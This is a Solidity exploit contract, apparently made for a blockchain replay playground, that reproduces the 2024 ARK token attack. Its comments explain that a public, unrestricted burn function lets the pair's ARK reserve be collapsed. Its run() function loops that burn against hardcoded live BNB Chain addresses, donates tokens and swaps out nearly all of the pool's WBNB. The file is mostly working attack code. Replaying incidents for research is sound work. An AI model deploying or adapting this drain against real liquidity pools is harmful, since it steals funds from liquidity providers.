// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-03-ARK).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this); testExploit() loops autoBurnLiquidityPairTokens()
// directly and then donates + swaps against the pair itself), so there is no
// standalone exploit contract to deploy. This contract is a faithful,
// self-contained copy of that inline attack so the playground can deploy it
// and record run(). Logic and constants are copied verbatim from
// test/ARK_exp.sol (ContractTest.testExploit), with the pre-attack `deal()`
// calls (WBNB seed of 100 wei, ARK seed of 4 ether) replicated by the config's
// `setup.steps` (dealToken) instead of Foundry's `deal()` cheatcode.
//
// Root cause: ARK (AbsToken).autoBurnLiquidityPairTokens() is `public` with NO
// access control and NO rate-limit check (the 1-hour `lpBurnFrequency` gate is
// only enforced on the internal `_transfer`-triggered path). Each call burns
// 0.3% of the pair's ARK balance straight to the dead address and then calls
// pair.sync() to force the pair to adopt the smaller ARK reserve — without
// touching the WBNB side at all. Looping this call collapses the ARK reserve
// to near-zero while the WBNB reserve stays pinned, letting the attacker
// donate a trivial amount of ARK/WBNB and swap out almost the entire honest
// WBNB reserve.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IArk is IERC20 {
    function autoBurnLiquidityPairTokens() external;
}

interface IUniPairV2 {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniRouterV2 {
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
}

contract ArkDrain {
    address private constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private constant ARK = 0xde698B5BBb4A12DDf2261BbdF8e034af34399999;
    address private constant ARK_WBNB = 0xc0F54B8755DAF1Fd78933335EfCD761e3D5B4a6F;
    address private constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    IERC20 private constant wbnb = IERC20(WBNB);
    IArk private constant ark = IArk(ARK);
    IUniPairV2 private constant pair = IUniPairV2(ARK_WBNB);
    IUniRouterV2 private constant router = IUniRouterV2(ROUTER);

    // Mirrors ContractTest.testExploit() verbatim (test/ARK_exp.sol:30-49).
    // Pre-attack seeding (100 wei WBNB, 4 ether ARK via Foundry `deal()`) is
    // replicated by the config's `setup.steps` before this recorded call.
    function run() external {
        uint256 i = 0;
        while (i < 10_000) {
            ark.autoBurnLiquidityPairTokens();
            if (ark.balanceOf(ARK_WBNB) < 1_700_000_000_000) {
                break;
            }
            i++;
        }
        wbnb.transfer(ARK_WBNB, 100);
        ark.transfer(ARK_WBNB, ark.balanceOf(address(this)));
        (uint256 reserve0, uint256 reserve1,) = pair.getReserves();
        uint256 arkBalance = ark.balanceOf(ARK_WBNB);
        address[] memory path = new address[](2);
        path[0] = ARK;
        path[1] = WBNB;
        uint256[] memory amountOut = router.getAmountsOut(arkBalance - reserve1, path);
        pair.swap(amountOut[1], 0, address(this), "");
    }
}
